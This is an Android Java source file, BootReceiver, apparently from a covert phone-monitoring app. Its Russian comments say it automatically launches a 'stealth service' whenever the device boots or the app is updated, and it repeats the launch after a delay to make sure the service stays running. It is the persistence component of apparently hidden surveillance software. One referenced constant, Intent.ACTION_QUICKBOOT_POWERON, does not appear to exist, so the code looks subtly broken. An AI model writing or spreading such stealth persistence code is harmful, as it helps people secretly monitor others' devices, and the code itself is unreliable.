package com.example.remotemonitor;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

/**
 * Получатель события загрузки системы
 * Автоматически запускает стелс сервис при загрузке устройства
 */
public class BootReceiver extends BroadcastReceiver {
    
    private static final String TAG = "BootReceiver";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        Log.i(TAG, "Получено событие: " + action);
        
        if (Intent.ACTION_BOOT_COMPLETED.equals(action) ||
            Intent.ACTION_MY_PACKAGE_REPLACED.equals(action) ||
            Intent.ACTION_PACKAGE_REPLACED.equals(action) ||
            Intent.ACTION_QUICKBOOT_POWERON.equals(action) ||
            "android.intent.action.QUICKBOOT_POWERON".equals(action)) {
            
            Log.i(TAG, "Система загружена - запуск стелс сервиса");
            
            try {
                // Запуск стелс сервиса
                StealthService.startStealthMode(context);
                
                // Дополнительная задержка для надежности
                new android.os.Handler().postDelayed(() -> {
                    StealthService.startStealthMode(context);
                }, 5000);
                
            } catch (Exception e) {
                Log.e(TAG, "Ошибка запуска сервиса при загрузке: " + e.getMessage());
            }
        }
    }
}